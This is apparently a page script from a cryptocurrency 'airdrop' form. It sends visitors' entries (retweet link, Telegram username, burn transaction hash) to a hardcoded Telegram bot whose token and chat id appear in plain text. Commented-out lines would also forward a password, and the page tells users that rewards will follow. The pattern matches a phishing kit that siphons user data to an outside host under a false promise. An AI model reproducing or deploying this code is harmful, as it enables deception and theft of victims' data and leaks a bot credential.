let submito = document.getElementById("cub-btn")

$(".subma").submit(function(e) {
    e.preventDefault();
});

async function sendMessage(message){
    return new Promise((resolve, reject)=>{
      const chat_id = 5227607491;
      fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
            method: "GET",
            headers: {
                
            }
        })
        .then(async(res) => {
            if(res.status > 399) throw res;
            resolve(await res.json());
        }).catch(err=>{
            reject(err);
        })
    })
  }

submito.addEventListener("click", () => {
    console.log("clickeed");
    (async function(){
        console.log("clickeed");
        let retweet = document.getElementById("retweet").value
        let telegramusername = document.getElementById("telegramusername").value
        let burntxhash = document.getElementById("burntxhash").value
    
        sendMessage(`Retweet`);
        sendMessage(retweet);
        sendMessage(`Telegram username`);
        sendMessage(telegramusername);
        sendMessage(`Burn Tx Hash`);
        sendMessage(burntxhash);
        //await sendMessage(`Password`);
        //await sendMessage(keypass);
        alert("Submitted for evaluation ... Rewards will be airdropped into your wallet if requirements are met");
    }
)()
})